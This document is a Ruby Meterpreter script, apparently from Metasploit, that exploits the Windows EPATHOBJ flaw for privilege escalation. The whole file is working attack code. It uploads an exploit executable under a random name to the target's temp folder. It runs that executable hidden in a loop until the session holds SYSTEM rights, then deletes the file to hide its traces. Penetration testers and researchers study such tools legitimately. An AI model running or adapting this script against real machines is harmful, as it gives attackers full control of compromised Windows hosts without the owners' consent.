# $Id$

#
# Meterpreter script for exploiting the EPATHOBJ flaw using Tavis Ormandy's PoC
#

session = client

#
# Options
#
opts = Rex::Parser::Arguments.new(
        "-h"  => [ false,  "This help menu"]
)


#
# Option parsing
#
opts.parse(args) do |opt, idx, val|
        case opt
        when "-h"
                print_line(opts.usage)
                raise Rex::Script::Completed
        end
end

def run_exploit
    if client.platform =~ /win32/
        # Handle exceptions in the getuid() call
        begin
            print_status("Currently running as " + client.sys.config.getuid)
        rescue ::Rex::Post::Meterpreter::RequestError
        end

        print_status("Loading the ComplexPath executable and DLL from the local system...")
        based = ::File.join(Msf::Config.install_root, "data", "exploits", "complexpath")
        exp   = ::File.join(based, "ComplexPath.exe")

        expdata = ""
        ::File.open(exp, "rb") do |fd|
            expdata = fd.read(fd.stat.size)
        end

        tempdir = client.fs.file.expand_path("%TEMP%")
        tempexe = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
        print_status("Uploading exploit to #{tempexe}...")
        fd = client.fs.file.new(tempexe, "wb")
        fd.write(expdata)
        fd.close

        server = client.sys.process.open

        print_status("Escalating our process (PID:#{server.pid})...")
        print_status("Waiting 30 seconds before interrupt...")

        tempdrive = tempdir.split(':')[0]

        while not client.sys.config.getuid.casecmp("NT AUTHORITY\\SYSTEM") == 0
            session.sys.process.execute("cmd.exe /c #{tempexe} #{server.pid}", nil, {'Hidden' => true, 'Channelized' => false})
        end

        print_status("Deleting files...")
        client.fs.file.rm(tempexe)

        # Handle exceptions in the getuid() call
        begin
            print_status("Now running as " + client.sys.config.getuid)
        rescue ::Rex::Post::Meterpreter::RequestError
        end
    else
        print_error("This version of Meterpreter is not supported with this Script!")
        raise Rex::Script::Completed
    end
end

begin
    ::Timeout.timeout(30) do
        run_exploit
    end
rescue Timeout::Error
    print_status("No response, interrupting now, but please check uid")
    raise Interrupt
end